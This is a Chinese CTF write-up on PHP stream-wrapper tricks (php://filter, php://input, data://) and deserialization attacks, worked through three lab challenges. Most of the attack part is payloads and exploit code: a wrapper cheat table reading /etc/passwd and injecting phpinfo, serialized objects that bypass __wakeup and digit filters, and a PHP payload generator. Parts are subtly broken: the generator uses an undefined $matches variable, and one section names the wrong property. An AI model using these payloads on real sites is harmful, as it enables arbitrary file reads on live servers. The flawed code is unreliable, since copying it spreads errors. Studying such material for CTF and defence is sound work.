---
title: PHP伪协议与反序列化利用
description: 系统梳理 PHP 伪协议（php://filter、php://input、data:// 等）利用技巧，深度解析反序列化漏洞中 __wakeup
  绕过（对象计数不匹配）、正则过滤数字绕过（+ 前缀）、base64 编码差异导致的利用细节。结合赣网杯2020、攻防世界 unserialize3 与 Web_php_unserialize
  实战题目完善利用链。
category: program-analysis
tags:
- PHP
- 伪协议
- 反序列化
- __wakeup
- __toString
- CTF
- 文件读取
- 绕过技巧
- 攻防世界
date: 2020-10-01
updated: '2026-11-14'
---
## 概述

本页面系统梳理 PHP 常见伪协议的特性与利用条件，重点分析如何结合 `php://filter` 读取源码、`php://input` 与 `data://` 绕过文件内容校验，以及如何利用 `__toString`、`__wakeup` 等魔术方法配合反序列化实现任意文件读取或代码执行。内容基于 **赣网杯2020**、**攻防世界（Attack-Defense World）高手进阶区** 实战题目复现，归档自 [[007攻防实验室]] 微信公众号文章及 [[attack-defense-world-master-advanced-writeup]] 相关题解。

## PHP 常见伪协议速查

> 官方文档：[PHP 封装协议](https://www.php.net/manual/zh/wrappers.php)

| 协议 | 作用 | 关键条件 | 典型 Payload 示例 |
| :--- | :--- | :--- | :--- |
| **file://** | 访问本地文件系统 | 默认开启 | `file:///etc/passwd` |
| **php://filter** | 读取文件并转换编码（如 Base64） | 默认开启 | `php://filter/read=convert.base64-encode/resource=index.php` |
| **php://input** | 读取 POST 请求原始数据体 | `allow_url_include=On` | `?file=php://input` (POST: `<?php phpinfo();?>`) |
| **data://** | 将数据作为文件流读取 | `allow_url_include=On` <br> `allow_url_fopen=On` <br> PHP>=5.2.0 | `data://text/plain;base64,PD9waHAgcGhwaW5mbygpOz8%2b` |
| **zip://** | 读取压缩包内文件 | 默认开启 | `zip://path/to/img.jpg%23shell.php` |
| **zlib://** | 读取压缩流 | 默认开启 | `compress.zlib://path/to/file` |

> **注意**：`include/require` 等包含函数受 `allow_url_include` 影响；`file_get_contents/fopen` 等读取函数受 `allow_url_fopen` 影响。

## 实战复现一：赣网杯2020 PHP 题目（`__toString` 利用链）

### 题目代码审计

```php
<?php
$sz_txt = $_GET["sz_txt"];
$sz_file = $_GET["sz_file"];
$password = $_GET["password"];

if(isset($sz_txt) && (file_get_contents($sz_txt, 'r') === "welcome to jxsz")){
    echo "<br><h1>".file_get_contents($sz_txt, 'r')."</h1></br>";
    if(preg_match("/flag/", $sz_file)){
        echo "Not now!";
        exit();
    }else{
        include($sz_file); // 提示 useless.php
        $password = unserialize($password);
        echo $password;
    }
}else{
    highlight_file(__FILE__);
}
?>
```

**逻辑梳理**：
1.  **校验点**：`sz_txt` 指向的内容必须完全等于 `"welcome to jxsz"`。
2.  **过滤点**：`sz_file` 不能包含 "flag" 字符串。
3.  **包含点**：包含 `sz_file` (需引入类定义文件 `useless.php`)。
4.  **触发点**：反序列化 `password` 并直接 `echo`，触发 `__toString` 魔术方法。

### 步骤一：绕过内容校验 (构造 "welcome to jxsz")

利用伪协议让 `file_get_contents` 读取可控输入流。

#### 方案 A：`php://input` (需 POST 请求)
*   **条件**：`allow_url_include=On` (题目存在 `include` 且成功，推测开启)。
*   **操作**：GET 参数 `sz_txt=php://input`，POST Body 发送 `welcome to jxsz`。

#### 方案 B：`data://` (推荐，仅需 GET)
*   **条件**：`allow_url_include=On` 且 `allow_url_fopen=On`。
*   **操作**：Base64 编码 `"welcome to jxsz"` -> `d2VsY29tZSB0byBqeHN6`。
*   **Payload**：
    ```text
    ?sz_txt=data://text/plain;base64,d2VsY29tZSB0byBqeHN6
    ```

### 步骤二：读取类定义源码 (`useless.php`)

题目过滤了 `flag` 关键词，注释提示包含 `useless.php`。利用 `php://filter` 读取源码并 Base64 编码输出，避免 PHP 解析执行。

*   **Payload**：
    ```text
    sz_file=php://filter/read=convert.base64-encode/resource=useless.php
    ```
*   **解码后源码**：
    ```php
    <?php
    class Flag{
        public $file;
        public function __tostring(){
            if(isset($this->file)){
                echo file_get_contents($this->file);
                echo "<br>";
                return ("So cool,continue plz");
            }
        }
    }
    ?>
    ```

### 步骤三：构造反序列化利用链 (`__toString` -> 任意文件读取)

**漏洞原理**：
1.  `unserialize($password)` 还原对象。
2.  `echo $password` 将对象作为字符串输出，自动调用 `__toString()`。
3.  `__toString()` 中执行 `file_get_contents($this->file)`，可控 `$file` 属性实现任意文件读取。

**EXP 构造脚本**：
```php
<?php
class Flag{
    public $file = "flag.php"; // 目标文件
    public function __tostring(){
        if(isset($this->file)){
            echo file_get_contents($this->file);
            echo "<br>";
            return ("So cool,continue plz");
        }
    }
}
$password = new Flag();
echo serialize($password);
// 输出: O:4:"Flag":1:{s:4:"file";s:8:"flag.php";}
?>
```

**最终综合 Payload** (需同时满足三个参数)：
```text
?sz_txt=data://text/plain;base64,d2VsY29tZSB0byBqeHN6
&sz_file=useless.php                     // 必须包含类定义文件
&password=O:4:"Flag":1:{s:4:"file";s:8:"flag.php";}
```

> **关键点**：`sz_file` 必须为 `useless.php` (或包含 Flag 类定义的文件)，否则反序列化时找不到类定义报错 (`__PHP_Incomplete_Class`)，无法触发 `__toString`。

---

## 实战复现二：攻防世界 `unserialize3`（`__wakeup` 绕过——对象计数不匹配）

> 来源：[[attack-defense-world-master-advanced-writeup]] 中的 `unserialize3` 题目。

### 核心原理：`__wakeup` 绕过 (CVE-2016-7124 类似机制)

当 `unserialize()` 处理序列化字符串时，会先解析对象属性个数（冒号后的数字，如 `O:4:"Class":1:{...}` 中的 `1`）。如果声明的属性个数 **大于** 实际序列化字符串中包含的属性个数，PHP 会**跳过** `__wakeup()` 方法的调用，直接创建对象。这是绕过 `__wakeup` 中重置属性、抛出异常等防御逻辑的关键技巧。

### 题目代码逻辑 (推测)

```php
class xctf {
    public $flag = '111';
    function __wakeup() {
        $this->flag = '111'; // 重置 flag，阻止读取敏感文件
    }
}
$password = unserialize($_GET['password']);
```

### 利用步骤

1.  **正常序列化输出**：
    `O:4:"xctf":1:{s:4:"flag";s:3:"111";}`
2.  **修改对象属性计数**：将 `1` 改为 `3` (或任意大于实际属性数的值)。
    `O:4:"xctf":3:{s:4:"flag";s:3:"111";}`
3.  **构造恶意属性值**：将 `flag` 属性值修改为目标文件路径（如 `flag.php`），并调整长度 `s:8:"flag.php"`。
    `O:4:"xctf":3:{s:4:"flag";s:8:"flag.php";}`

### 最终 Payload
```text
?password=O:4:"xctf":3:{s:4:"flag";s:8:"flag.php";}
```
**效果**：`__wakeup` 未执行，`$this->file` 保持为 `flag.php`，后续逻辑（如 `__destruct` 或 `__toString`）读取 Flag。

---

## 实战复现三：攻防世界 `Web_php_unserialize`（综合绕过链：`__wakeup` + 正则绕过 + Base64 差异）

> 来源：[[attack-defense-world-master-advanced-writeup]] 中的 `Web_php_unserialize` 题目。

该题目综合考察了三个关键绕过点，是反序列化利用链构造的经典案例。

### 题目代码审计 (关键片段)

```php
<?php
// ... 前置代码 ...
$var = $_GET['var'];

// 1. 正则过滤数字
if (preg_match('/\d+/', $var)) {
    die("No numbers allowed!");
}

// 2. Base64 解码后反序列化
$data = base64_decode($var);
$obj = unserialize($data);

// ... 后续触发点 (如 __destruct 调用 highlight_file) ...
?>
```

### 绕过点一：正则过滤数字绕过（`+` 前缀）

*   **过滤规则**：`preg_match('/\d+/', $var)` 禁止出现数字字符 `0-9`。
*   **序列化格式痛点**：PHP 序列化字符串 **必须** 包含数字（对象属性计数、字符串长度、整数值等），如 `O:4:"Demo":1:{s:4:"file";s:8:"flag.php";}` 中的 `4`, `1`, `4`, `8`。
*   **绕过技巧**：PHP 在解析序列化字符串时，支持 **`+` 号前缀的整数** (如 `:+4`, `:+1`, `:+8`)。
*   **操作**：将序列化字符串中所有的数字 `N` 替换为 `+N`。
    *   原：`O:4:"Demo":1:{s:4:"file";s:8:"flag.php";}`
    *   绕过后：`O:+4:"Demo":+1:{s:+4:"file";s:+8:"flag.php";}`

### 绕过点二：`__wakeup` 绕过（对象计数不匹配）

*   **防御代码**：
    ```php
    function __wakeup() {
        if ($this->file != 'index.php') {
            $this->file = 'index.php'; // 重置文件名
        }
    }
    ```
*   **利用方式**：同 `unserialize3`，修改对象声明的属性计数大于实际属性数。
*   **结合绕过点一**：计数数字也需加 `+` 号。
    *   修改前：`O:+4:"Demo":+1:{...}`
    *   修改后：`O:+4:"Demo":+2:{s:+4:"file";s:+8:"flag.php";}` (声明 2 个属性，实际只有 1 个)

### 绕过点三：Base64 编码差异（本地生成 vs 在线工具/手工替换）

*   **现象**：直接对修改后的序列化字符串进行 `base64_encode` 可能因特殊字符（如 `:+`、花括号、分号、引号）在不同环境（在线工具、PHP `serialize()` 函数、手工字符串拼接）下产生 **不可见字符、空格、换行符差异**，导致解码后反序列化失败（报错 `unserialize(): Error at offset...`）。
*   **根因**：
    1.  在线 Base64 编码工具可能对输入字符串进行 `trim()` 或 URL 编码处理。
    2.  PHP `serialize()` 生成的字符串包含精确的长度计算，手工修改长度极易出错。
    3.  `:+` 这种非标准序列化格式虽然 PHP 解析器接受，但部分库可能不支持生成。
*   **最佳实践（本地化脚本生成）**：
    编写本地 PHP 脚本，**通过代码逻辑构造对象、修改属性、序列化、字符串替换、Base64 编码**，保证字节级一致性。

**本地 EXP 生成脚本**：
```php
<?php
class Demo {
    private $file = 'index.php'; // 需与目标类定义一致 (包括访问修饰符 private/protected/public)
    
    public function __construct($file) {
        $this->file = $file;
    }
    
    function __destruct() {
        echo @highlight_file($this->file, true);
    }
    
    function __wakeup() {
        if ($this->file != 'index.php') {
            $this->file = 'index.php';
        }
    }
}

// 1. 实例化对象，设置目标文件
$obj = new Demo('fl4g.php');

// 2. 序列化
$a = serialize($obj);
// 输出示例: O:4:"Demo":1:{s:4:"file";s:8:"fl4g.php";} (注意私有属性序列化时会包含 \00Demo\00file)

// 3. 代码级替换：绕过数字正则 (\d+) -> 加 + 号
// 注意：私有属性名序列化格式为 s:13:"\00Demo\00file"，长度计数也需修改
$b = str_replace([':1:', ':4:', ':8:', ':13:'], [':+1:', ':+4:', ':+8:', ':+13:'], $a);
// 更稳健的正则替换所有数字 (除非数字在字符串内容中，但此处文件名无数字)
$b = preg_replace('/(?<!:):(\d+)/', ':+$1', $a); // 简略示例，实际需精确匹配格式字段

// 4. 绕过 __wakeup：修改对象属性计数 (O:4:"Demo":1 -> O:4:"Demo":+2)
// 假设原属性计数为 1
$b = preg_replace('/(O:\+\d+:"Demo":)\+(\d+)/', '$1+'.($matches[2]+1), $b); // 计数+1

// 5. Base64 编码输出
echo "Raw Serialized: " . $b . "\n";
echo "Base64 Payload: " . base64_encode($b) . "\n";
?>
```

> **关键细节**：
> *   **属性访问修饰符**：目标类如果是 `private $file`，序列化时属性名会变为 `\00ClassName\00file` (长度含两个空字节)，替换长度时必须精确计算。建议本地定义 **完全一致的类结构** 让 PHP 引擎自动计算长度。
> *   **空格与换行**：`base64_encode` 输出无换行，直接用于 URL 参数需 `urlencode` (处理 `+`, `/`, `=`)。

### 最终攻击流程

1.  本地运行上述脚本获取 `Base64 Payload`。
2.  URL 编码 Payload (特别是 `+` 号变 `%2B`, `/` 变 `%2F`, `=` 变 `%3D`)。
3.  请求目标：`http://target/?var=<URL_Encoded_Base64_Payload>`。
4.  触发 `__destruct` (脚本结束) -> 读取 `fl4g.php` 内容高亮输出。

---

## 核心知识点总结

### 伪协议组合拳
*   **`data://` + `php://filter`**：`data://` 用于注入可控字符串绕过校验；`php://filter` 用于源码泄露（绕过 `include` 执行、获取类结构）。
*   **条件依赖**：利用前必确认 `phpinfo()` 或报错回显中的 `allow_url_fopen` 与 `allow_url_include` 状态。

### 反序列化魔术方法利用链对比

| 魔术方法 | 触发时机 | 核心利用条件 | 典型绕过/利用点 | 本文涉及题目 |
| :--- | :--- | :--- | :--- | :--- |
| **`__wakeup`** | `unserialize()` 成功后 | 类定义中存在 `__wakeup` 且有防御逻辑 | **对象属性计数不匹配** (声明 > 实际) 绕过执行 | `unserialize3`, `Web_php_unserialize` |
| **`__toString`** | 对象作为字符串使用 (`echo`/拼接) | 代码中直接 `echo $obj` 或字符串拼接 | 控制属性进入 `file_get_contents` / SQL / `file_put_contents` | 赣网杯2020 |
| **`__destruct`** | 对象销毁 (脚本结束/引用计数为0) | 无特殊条件，最通用触发点 | 文件操作、命令执行、链式调用起点 | `Web_php_unserialize` |
| **`__construct`** | 对象创建 (`new`) | 反序列化**不触发** (仅 `new` 触发) | 仅用于本地生成 Payload 时初始化属性 | 本地 EXP 脚本 |
| **`__sleep`** | `serialize()` 之前 | 可控制序列化哪些属性 | 隐藏敏感属性、配合 `__wakeup` 逻辑 | - |

### CTF 反序列化实战避坑指南

1.  **类定义一致性**：反序列化要求目标类在当前命名空间/作用域中已定义 (`include/require` 或自动加载)。本地生成 Payload 时，**必须 1:1 复制目标类代码**（属性名、修饰符 `private/protected/public`、命名空间），否则生成的序列化字符串无法正确还原对象属性（会变成 `__PHP_Incomplete_Class`）。
2.  **数字绕过通用性**：`preg_match('/\d/')` 过滤数字是常见 WAF 规则。`+` 前缀绕过 (`:+1`, `:+8`) 适用于 PHP 原生 `unserialize`。若目标使用 `igbinary` 或其他序列化器需验证兼容性。
3.  **Base64 编码链路**：
    *   `Payload -> base64_encode -> urlencode -> 传输 -> urldecode -> base64_decode -> unserialize`
    *   务必在本地脚本 `echo urlencode(base64_encode($serialized));` 一气呵成，避免手工拼接导致字符串污染。
4.  **私有/受保护属性序列化格式**：
    *   `private $prop` -> `s:length:"\00ClassName\00prop"`
    *   `protected $prop` -> `s:length:"\00*\00prop"`
    *   长度计算包含两个不可见字节 (`\00`)，手工修改极易出错，**强制要求本地代码生成**。

## 关联页面

*   [[007攻防实验室]] - 文章来源归档库，包含更多 CTF 实战笔记（赣网杯2020等）。
*   [[attack-defense-world-master-advanced-writeup]] - 攻防世界高手进阶区完整 Writeup 索引，包含 `unserialize3`、`Web_php_unserialize` 等题目详解。
*   [[ctf-show-php-command-execution-bypass-techniques]] - PHP 命令执行与绕过技巧体系，涉及 `disable_functions`、`open_basedir` 等后续利用环境。
*   [[php-webshell-fundamentals-chopper-analysis]] - PHP Webshell 基础与蚁剑流量分析，反序列化 Getshell 后的后续操作参考。

## 参考资源

*   PHP 官方手册：[封装协议](https://www.php.net/manual/zh/wrappers.php)
*   PHP 官方手册：[魔术方法](https://www.php.net/manual/zh/language.oop5.magic.php)
*   PHP 官方手册：[unserialize](https://www.php.net/manual/zh/function.unserialize.php) (注释中有 `__wakeup` 绕过讨论)
*   CVE-2016-7124: PHP `__wakeup` 绕过漏洞分析 (对象计数不匹配)
*   赣网杯2020 Writeup 原文 (微信归档)
*   攻防世界靶场在线实战环境

## 来源

- [007攻防实验室-202007-202010_2](../sources/007攻防实验室-202007-202010_2.md)
- [攻防世界高手进阶区page1](../sources/攻防世界高手进阶区page1.md) (即用户提供的归档文章内容)
- [0x00实验室-202108-202304_065](../sources/0x00实验室-202108-202304_065.md)
